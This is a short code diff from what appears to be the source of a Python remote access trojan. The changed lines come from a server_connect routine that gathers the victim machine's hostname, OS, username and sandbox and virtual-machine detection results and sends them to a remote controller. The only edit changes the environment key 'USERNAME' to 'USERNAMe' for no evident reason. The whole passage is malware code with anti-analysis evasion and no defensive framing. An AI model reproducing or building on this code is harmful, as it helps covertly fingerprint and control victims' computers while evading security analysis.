@@ -120,7 +120,7 @@ def server_connect():
         
         else: break
 
-    struserInfo = socket.gethostname() + "',"+platform.system()+" " + platform.release() + detectSandboxie() + detectVM() + "'," + os.environ["USERNAME"]
+    struserInfo = socket.gethostname() + "',"+platform.system()+" " + platform.release() + detectSandboxie() + detectVM() + "'," + os.environ["USERNAMe"]
     send(str.encode(struserInfo))
 
 decode_utf8 = lambda data: data.decode("utf-8")
